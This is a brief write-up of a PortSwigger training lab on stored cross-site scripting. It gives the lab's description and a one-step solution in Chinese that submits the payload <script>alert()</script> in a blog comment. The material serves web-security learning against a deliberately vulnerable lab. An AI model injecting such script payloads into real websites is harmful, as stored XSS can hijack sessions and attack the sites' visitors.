# Stored XSS into HTML context with nothing encoded

## Information
---

- [PortSwigger - Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 

## Solution
---

1. 將以下 payload 輸入至 Leave a comment 方框當中。
    ```html
    <script>alert()</script>
    ```